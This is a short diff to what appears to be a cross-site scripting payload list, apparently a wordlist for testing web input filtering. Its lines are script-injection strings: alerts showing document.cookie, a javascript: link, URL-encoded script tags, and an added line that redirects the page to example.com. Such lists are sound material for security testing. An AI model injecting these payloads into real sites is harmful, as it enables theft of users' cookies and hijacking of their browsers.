@@ -7,6 +7,7 @@
 '><script>alert(document.cookie)</script>
 '><script>alert(document.cookie);</script>
 \";alert('XSS');//
+<script>window.location = "http://www.example.com/";</script>
 [Click here](javascript:alert(1))
 %3cscript%3ealert("WXSS");%3c/script%3e
 %3cscript%3ealert(document.cookie);%3c%2fscript%3e
